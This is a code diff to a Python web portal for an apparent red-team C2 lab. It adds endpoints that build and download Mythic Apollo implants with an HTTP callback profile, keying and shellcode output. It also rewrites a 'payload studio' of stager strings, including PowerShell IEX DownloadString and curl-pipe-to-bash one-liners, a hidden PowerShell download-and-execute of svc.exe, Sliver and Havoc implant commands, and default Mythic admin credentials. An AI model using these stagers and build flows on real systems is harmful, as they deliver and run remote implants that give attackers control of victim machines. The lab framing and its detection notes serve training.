@@ -51,6 +51,11 @@ REDIRECTOR_PORT = int(os.environ.get("REDIRECTOR_HTTP_PORT", "80"))
 C2_HEADER_NAME = os.environ.get("C2_HEADER_NAME", "X-Request-ID")
 C2_HEADER_VALUE = os.environ.get("C2_HEADER_VALUE", "cadre-c2")
 MERIDIAN_DNS_DOMAIN = os.environ.get("MERIDIAN_DNS_DOMAIN", "c2.cadre.local")
+# Victim-facing IP of the redirector host (what implants phone home to).
+# Was hardcoded as 192.168.77.1 in a dozen stager strings; a lab on other
+# addressing would silently generate wrong stagers, so it is env-driven now.
+VICTIM_REDIRECTOR_IP = os.environ.get("VICTIM_REDIRECTOR_IP", "192.168.77.1")
+MERIDIAN_DNS_PORT = int(os.environ.get("MERIDIAN_DNS_PORT", "15353"))
 
 FRAMEWORK_PREFIXES = {
     "meridian": os.environ.get("MERIDIAN_URI_PREFIX", "/gateway/v1/telemetry"),
@@ -262,7 +267,7 @@ class VictimCommandRequest(BaseModel):
 
 class AdaptixListenerRequest(BaseModel):
     name: str = Field("cadre_http", description="Listener instance name")
-    callback_address: str = Field("192.168.77.1:80",
+    callback_address: str = Field(f"{VICTIM_REDIRECTOR_IP}:80",
                                   description="Where the AGENT dials (the redirector)")
     uri: str = Field("/api/v1/sync", description="Must match ADAPTIX_URI_PREFIX")
     port: int = Field(80, description="In-container bind port")
@@ -354,7 +359,7 @@ class SliverGenerateRequest(BaseModel):
     kind: str = Field("session", description="beacon | session (sessions are "
                                              "taskable immediately; beacons need "
                                              "`interactive` first)")
-    c2_url: str = Field("192.168.77.1:80/cloud/storage/objects",
+    c2_url: str = Field(f"{VICTIM_REDIRECTOR_IP}:80/cloud/storage/objects",
                         description="Implant callback URL (redirector prefix)")
     target_os: str = Field("windows", description="windows | linux")
     arch: str = Field("amd64", description="amd64 | 386")
@@ -383,6 +388,150 @@ def ops_sliver_tasks(beacon_id: str) -> dict[str, Any]:
 class MythicUploadResponse(BaseModel):
     agent_file_id: str
     filename: str
+
+
+class MythicBuildRequest(BaseModel):
+    output_type: str = Field("WinExe", description="WinExe | Shellcode | Service | Source")
+    shellcode_format: str = Field("Binary", description="Donut format for Shellcode")
+    shellcode_bypass: str = Field("Continue on fail")
+    debug: bool = Field(False)
+    adjust_filename: bool = Field(True)
+    enable_keying: bool = Field(False)
+    keying_method: str = Field("Hostname", description="Hostname | Domain | Registry")
+    keying_value: str = Field("", description="Upper-cased at build; Domain compares NETBIOS UserDomainName")
+    registry_path: str = Field("")
+    registry_value: str = Field("")
+    registry_comparison: str = Field("Matches", description="Matches | Contains")
+    filename: str = Field("apollo-portal.exe")
+    # NOTE: Registry keying is broken upstream (CS1009 on any real path);
+    # the endpoint passes values through and reports the build error plainly.
+
+
+def _mythic_http_c2() -> dict[str, Any]:
+    """Working http-profile C2 shape (bare host + full-path post_uri).
+
+    A rooted post_uri REPLACES any base path (HttpProfile.cs ParseURLAndPort),
+    so a path-carrying host + "data" silently phones http://host/data into the
+    decoy. callback_host carries no port (OPSEC rejects it).
+    """
+    return {
+        "callback_host": f"http://{VICTIM_REDIRECTOR_IP}",
+        "callback_port": REDIRECTOR_PORT,
+        "callback_interval": 10,
+        "callback_jitter": 23,
+        "headers": {C2_HEADER_NAME: C2_HEADER_VALUE},
+        "post_uri": f"{FRAMEWORK_PREFIXES['mythic']}/data",
+        "AESPSK": "aes256_hmac",
+        "encrypted_exchange_check": True,
+        "killdate": "2027-09-07",
+        "proxy_host": "",
+        "proxy_port": "",
+        "proxy_user": "",
+        "proxy_pass": "",
+    }
+
+
+@app.post("/api/ops/mythic/build")
+def ops_mythic_build(req: MythicBuildRequest) -> dict[str, Any]:
+    """Submit an Apollo build. Returns immediately with the payload uuid.
+
+    dotnet builds take minutes and would block the single uvicorn worker, so
+    submission is sync but the BUILD is async server-side: poll
+    GET /api/ops/mythic/build/{uuid} for phase, then fetch the binary from
+    GET /api/ops/mythic/payload/{uuid}.
+    """
+    client = cb.MythicClient()
+    params = {
+        "output_type": req.output_type,
+        "shellcode_format": req.shellcode_format,
+        "shellcode_bypass": req.shellcode_bypass,
+        "adjust_filename": req.adjust_filename,
+        "debug": req.debug,
+        "enable_keying": req.enable_keying,
+        "keying_method": req.keying_method,
+        "keying_value": req.keying_value,
+        "registry_path": req.registry_path,
+        "registry_value": req.registry_value,
+        "registry_comparison": req.registry_comparison,
+    }
+    definition = {
+        "payload_type": "apollo",
+        "selected_os": "Windows",
+        "filename": req.filename,
+        "description": f"portal build {req.output_type}",
+        "build_parameters": [{"name": k, "value": v} for k, v in params.items()],
+        "c2_profiles": [{"c2_profile": "http",
+                         "c2_profile_parameters": _mythic_http_c2()}],
+        # Loader commands included so COFF flows work out of the box.
+        "commands": ["shell", "whoami", "ls", "ps", "download", "upload",
+                     "execute_coff", "register_coff", "register_file",
+                     "powershell", "run", "sleep", "exit"],
+    }
+    try:
+        out = client.post(
+            "/api/v1.4/createpayload_webhook",
+            {"input": {"payloadDefinition": json.dumps(definition)}})
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+    # Webhook replies arrive as CONCATENATED json objects ({...}{...});
+    # find the success chunk carrying the uuid.
+    uuid = ""
+    for chunk in json.dumps(out).split("}{"):
+        try:
+            obj = json.loads(chunk if chunk.startswith("{") else "{" + chunk)
+            if isinstance(obj, dict) and obj.get("uuid"):
+                uuid = obj["uuid"]
+        except ValueError:
+            continue
+    if not uuid:
+        raise HTTPException(status_code=502,
+                            detail=f"build not queued: {json.dumps(out)[:300]}")
+    return {"ok": True, "uuid": uuid,
+            "status_url": f"/api/ops/mythic/build/{uuid}"}
+
+
+@app.get("/api/ops/mythic/build/{uuid}")
+def ops_mythic_build_status(uuid: str) -> dict[str, Any]:
+    """Build phase for a submitted Apollo payload."""
+    import re as _re
+    # mythic_psql does no parameter binding: whitelist the uuid shape so a
+    # path parameter can never become SQL.
+    if not _re.fullmatch(r"[0-9a-fA-F-]{36}", uuid or ""):
+        raise HTTPException(status_code=400, detail="malformed payload uuid")
+    try:
+        rows = cb.mythic_psql(
+            "SELECT build_phase, left(build_message, 500), "
+            f"left(build_stderr, 500) FROM payload WHERE uuid='{uuid}';",
+            ["phase", "message", "stderr"])
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+    if not rows:
+        raise HTTPException(status_code=404, detail="unknown payload uuid")
+    r = rows[0]
+    out: dict[str, Any] = {"ok": True, "uuid": uuid, "phase": r.get("phase"),
+                           "message": (r.get("message") or "")[:500]}
+    if r.get("phase") == "error":
+        out["stderr"] = (r.get("stderr") or "")[-800:]
+    if r.get("phase") == "success":
+        out["download_url"] = f"/api/ops/mythic/payload/{uuid}"
+    return out
+
+
+@app.get("/api/ops/mythic/payload/{uuid}")
+def ops_mythic_payload(uuid: str):
+    """Download a built Apollo payload through the portal (JWT stays inside)."""
+    import re as _re
+    from fastapi.responses import Response as FastAPIResponse
+    if not _re.fullmatch(r"[0-9a-fA-F-]{36}", uuid or ""):
+        raise HTTPException(status_code=400, detail="malformed payload uuid")
+    client = cb.MythicClient()
+    try:
+        data = client.get(f"/direct/download/{uuid}", timeout=300)
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+    return FastAPIResponse(
+        content=data, media_type="application/octet-stream",
+        headers={"Content-Disposition": f'attachment; filename="apollo-{uuid}.bin"'})
 
 
 @app.post("/api/ops/mythic/upload")
@@ -589,6 +738,7 @@ def get_status() -> dict[str, Any]:
         "timestamp": datetime.now(timezone.utc).isoformat(),
         "docker_available": bool(docker_containers),
         "redirector_http_port": REDIRECTOR_PORT,
+        "victim_redirector_ip": VICTIM_REDIRECTOR_IP,
         "c2_header": f"{C2_HEADER_NAME}: {C2_HEADER_VALUE}",
         "services": services_status,
     }
@@ -806,15 +956,15 @@ def get_payload_studio() -> dict[str, Any]:
             "stagers": {
                 "powershell_http": (
                     f'$wc=New-Object Net.WebClient; $wc.Headers.Add("{C2_HEADER_NAME}","{C2_HEADER_VALUE}"); '
-                    f'IEX($wc.DownloadString("http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]}"))'
+                    f'IEX($wc.DownloadString("http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]}"))'
                 ),
                 "powershell_dns": (
-                    '$cmd = (Resolve-DnsName -Name "init.c2.cadre.local" -Type TXT -Server "192.168.77.1").Strings; '
+                    f'$cmd = (Resolve-DnsName -Name "init.c2.cadre.local" -Type TXT -Server "{VICTIM_REDIRECTOR_IP}").Strings; '
                     'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd)))'
                 ),
                 "bash_curl": (
                     f'curl -s -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" '
-                    f'http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]} | bash'
+                    f'http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]} | bash'
                 ),
                 "binary_compile": "GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o parallax-windows-amd64.exe ./implant",
             },
@@ -828,8 +978,8 @@ def get_payload_studio() -> dict[str, Any]:
             "name": "BishopFox Sliver",
             "description": "Enterprise-grade Go implant framework supporting in-memory .NET execution, BOFs, and lateral movement.",
             "stagers": {
-                "generate_session": "sliver > generate --http 192.168.77.1:80 --os windows --arch amd64 --save ./implant.exe",
-                "powershell_c2": f'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["sliver"]}\', \'$env:TEMP\\svc.exe\'); Start-Process \'$env:TEMP\\svc.exe\'"',
+                "generate_session": f"sliver > generate --http {VICTIM_REDIRECTOR_IP}:80 --os windows --arch amd64 --save ./implant.exe",
+                "powershell_c2": f'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["sliver"]}\', \'$env:TEMP\\svc.exe\'); Start-Process \'$env:TEMP\\svc.exe\'"',
                 "execute_assembly": "sliver (session) > execute-assembly /opt/tools/Rubeus.exe triage",
             },
             "detection": {
@@ -843,7 +993,7 @@ def get_payload_studio() -> dict[str, Any]:
             "description": "Modern C++ Demon payload featuring indirect syscalls, API hashing, and Ekko/Zilean sleep masking.",
             "stagers": {
                 "demon_build": "Havoc Client -> Attack -> Payload -> Format: Windows EXE/DLL -> Indirect Syscalls: Enabled -> Sleep Technique: Ekko",
-                "delivery": f'curl -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["havoc"]} -o payload.exe',
+                "delivery": f'curl -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["havoc"]} -o payload.exe',
             },
             "detection": {
                 "network": "HTTP/HTTPS heartbeats with custom user-agents and jitter.",
@@ -855,8 +1005,8 @@ def get_payload_studio() -> dict[str, Any]:
             "name": "Adaptix C2",
             "description": "Go-based post-exploitation teamserver for multiplayer operations with Gopher TCP agent.",
             "stagers": {
-                "client_connect": "Adaptix Qt GUI Client -> Endpoint: 192.168.77.1:4321 -> User: operator",
-                "stager_cmd": f'powershell -c "Invoke-WebRequest -Uri http://192.168.77.1:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["adaptix"]} -OutFile agent.exe"',
+                "client_connect": f"Adaptix Qt GUI Client -> Endpoint: {VICTIM_REDIRECTOR_IP}:4321 -> User: operator (or headless REST: POST /endpoint/login, see Module 4)",
+                "stager_cmd": f'powershell -c "Invoke-WebRequest -Uri http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["adaptix"]} -OutFile agent.exe"',
             },
             "detection": {
                 "network": "Raw TCP/mTLS egress or HTTP sync calls on port 80.",
@@ -868,9 +1018,9 @@ def get_payload_studio() -> dict[str, Any]:
             "name": "Mythic C2",
             "description": "Multi-agent collaborative framework (Apollo for Windows, Poseidon for Linux/macOS). Latest stable = 3.4.0.61 (v4 ships profiles built-in, not yet GA).",
             "stagers": {
-                "rest_login": "curl -s http://192.168.77.1:7443/auth -X POST -H 'Content-Type: application/json' -d '{\"username\":\"mythic_admin\",\"password\":\"mythic\"}'",
-                "payload_build": "create_c2parameter_instance_webhook (input: instance_name + c2profile_id=1 + c2_instance JSON-string with callback_host WITHOUT port) -> start_stop_profile_webhook {id:1, action:start} -> createpayload_webhook {payloadDefinition JSON-string: payload_type=apollo, selected_os=Windows, c2_profiles=[{c2_profile:http, c2_profile_parameters:{callback_host/callback_port/headers}}]} -> download exe via GET /direct/download/<uuid>. Verified working; see Docker/mythic/README.md.",
-                "ui_url": "http://192.168.77.1:7443 (REST/psql surface; the browser UI is upstream optional containers we don't ship)",
+                "rest_login": f"curl -s http://{VICTIM_REDIRECTOR_IP}:7443/auth -X POST -H 'Content-Type: application/json' -d '{{\"username\":\"mythic_admin\",\"password\":\"mythic\"}}'",
+                "payload_build": f"create_c2parameter_instance_webhook -> start_stop_profile_webhook -> createpayload_webhook (payloadDefinition JSON-STRING, build_parameters as LIST; C2 shape: bare callback_host http://{VICTIM_REDIRECTOR_IP} + full-path post_uri /cdn/media/stream/data) -> download exe via GET /direct/download/<uuid>. Verified working incl. keying + COFF; see Docker/mythic/README.md and Module 5.",
+                "ui_url": f"http://{VICTIM_REDIRECTOR_IP}:7443 (REST/psql surface; the browser UI is upstream optional containers we don't ship)",
             },
             "detection": {
                 "network": "Customizable HTTP profile mimicking common CDN streaming services.",
@@ -950,7 +1100,9 @@ def ops_summary() -> dict[str, Any]:
         "note": ("Havoc 0.7 exposes NO REST/gRPC API - the operator protocol is "
                  "WebSocket+TLS on 40056. The portal drives it via a raw "
                  "WebSocket client (see /api/ops/havoc/*)."),
-        "teamserver": "192.168.77.1:40056",
+        "teamserver": f"havoc:{os.environ.get('HAVOC_TS_PORT', '40056')} "
+                        "(operator WebSocket; victim-facing callback goes "
+                        "through the redirector, not here)",
         "user": "5pider",
     }
     out["redirector"] = {
